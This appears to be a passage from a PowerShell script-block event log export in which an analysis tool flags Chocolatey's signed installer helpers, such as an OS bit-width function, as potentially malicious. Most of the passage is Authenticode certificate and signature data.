gG3udMTnJMaN6dlMy1ijbv+kaaIlMBUJluoWePzhsqFpm8B9RF1pfYcic/6z1QMi # jGzmtqMGC2bDkyvwQzAJOm0ChHMS6+79B83+i4DZ8XLSWVLVfIbjHHPxUWTJCRXw # nCIsBEJtwmk4AjHoIrMdsN058HnBAse/nS7NThZYlWoQEwbbgvqruKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU1WjAjBgkqhkiG9w0BCQQxFgQUyY9g1N0HMjWVyi3G # LWmwfeJbhiswDQYJKoZIhvcNAQEBBQAEggEATgvFSijRgKyoEI8ttKowwtSVxAwN # gNXzSRpGuaOjNEejxlaOw7DbhvHzcOEYcXvrQmD1uavDntsAte2qWMA7e+fS8ztV # Afb8ttnPHwjfFCyZ54u7SjkKZxShf9JdMRUIvpbv3HL6k/gJgfQVVkQRwyQGXRAO # CVDG7mzU3B8D8u1SnQzfryLwIFBd28p/wtijIzci4msUDlX2+VVGr+IBcSIsaa9Y # h1atL3hS6VuF4yL64iRXcICn1Ev68OPqTxeQd2UZHqZKVjL4h+4iGS/WZ6zoLxN/ # aGRaodZ1dtzz4uT610c7uWpKmAzb9V/cUwhahEiSspNng09908jESsHDAg== # SIG # End signature block","MessageNumber: 2 ¦ MessageTotal: 2 ¦ Path: C:\Users\IEUser\AppData\Local\Temp\chocolatey\chocInstall\tools\chocolateyInstall\helpers\functions\Get-ChocolateyUnzip.ps1 ¦ ScriptBlockId: e80ddd53-40cb-4fd7-8441-1ba99d455693 ¦ ScriptBlockText: IOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgweHzSplZ494On1UQFNZDNo1+C5hVFonFT0Z4 # XKG21e0wDQYJKoZIhvcNAQEBBQAEggEABukrTx8PYcKco9MQ6RcHIKVMqR9HLAnV # PohcjWRijEW5TfoLp6uGzyhKKHGDjH0+ZwkJ+J5O3IX5erp7MUuTVidPB87iW1Gz # fUgUvX12PnTzEvOp3p49uyqCzeXgH4NVl6/iZsYqlKefg94rX6oOBhMAWFotjBu9 # gG3udMTnJMaN6dlMy1ijbv+kaaIlMBUJluoWePzhsqFpm8B9RF1pfYcic/6z1QMi # jGzmtqMGC2bDkyvwQzAJOm0ChHMS6+79B83+i4DZ8XLSWVLVfIbjHHPxUWTJCRXw # nCIsBEJtwmk4AjHoIrMdsN058HnBAse/nS7NThZYlWoQEwbbgvqruKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU1WjAjBgkqhkiG9w0BCQQxFgQUyY9g1N0HMjWVyi3G # LWmwfeJbhiswDQYJKoZIhvcNAQEBBQAEggEATgvFSijRgKyoEI8ttKowwtSVxAwN # gNXzSRpGuaOjNEejxlaOw7DbhvHzcOEYcXvrQmD1uavDntsAte2qWMA7e+fS8ztV # Afb8ttnPHwjfFCyZ54u7SjkKZxShf9JdMRUIvpbv3HL6k/gJgfQVVkQRwyQGXRAO # CVDG7mzU3B8D8u1SnQzfryLwIFBd28p/wtijIzci4msUDlX2+VVGr+IBcSIsaa9Y # h1atL3hS6VuF4yL64iRXcICn1Ev68OPqTxeQd2UZHqZKVjL4h+4iGS/WZ6zoLxN/ # aGRaodZ1dtzz4uT610c7uWpKmAzb9V/cUwhahEiSspNng09908jESsHDAg== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:31.902 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,60,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Get-OSArchitectureWidth { <# .SYNOPSIS Get the operating system architecture address width. .DESCRIPTION This will return the system architecture address width (probably 32 or 64 bit). If you pass a comparison, it will return true or false instead of {`32`|`64`}. .NOTES When your installation script has to know what architecture it is run on, this simple function comes in handy. Available as `Get-OSArchitectureWidth` in 0.9.10+. If you need compatibility with pre 0.9.10, please use the alias `Get-ProcessorBits`. .INPUTS None .OUTPUTS None .PARAMETER Compare This optional parameter causes the function to return $true or $false, depending on wether or not the bit width matches. #> param( $compare ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters $bits = 64 if (([System.IntPtr]::Size -eq 4) -and (Test-Path env:\PROCESSOR_ARCHITEW6432)) { $bits = 64 } elseif ([System.IntPtr]::Size -eq 4) { $bits = 32 } # Return bool|int if (""$compare"" -ne '' -and $compare -eq $bits) { return $true } elseif (""$compare"" -ne '') { return $false } else { return $bits } } Set-Alias Get-ProcessorBits Get-OSArchitectureWidth Set-Alias Get-OSBitness Get-OSArchitectureWidth # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCC+5R24zufGXnsc # mWj/25mf6jwe97cvRY7+8fCOG4I2J6CCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgP758QKNsTW8rWPEwFItvwYU40LERXrsVnMIx # EW0I+YIwDQYJKoZIhvcNAQEBBQAEggEAnYGeuRcmWugYjQnOQJRgsG/fTDMry1sv # PxtTaoIGjlW8iPLJk58sQdyQxEfkcsNe58bwKnvB8B0kvMol/AES2Esz4QYX/A7Z # iXdB1XxsQVio7B8XsQdGmePNEeIda18ExPkIyDnKD2grpDiFz8vaQp8CsZZcfZzc # fbM5qcUF5HFCdTI4gFxb3NXduCk7mOIhDajJH4cVpdz0N1FfVuTR+sDErHUS72vd # BQtW/gOPSA0JIetcmJrqvRXdx3n0Sp32kBxn7XyypO1L3PxBgZwW94ekQDIe5v3F # SKlmv2E38T0tU5/IUX2PNV3vMKWHs3E7Me6r6+h1TcHeXhTrRrV586GCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # 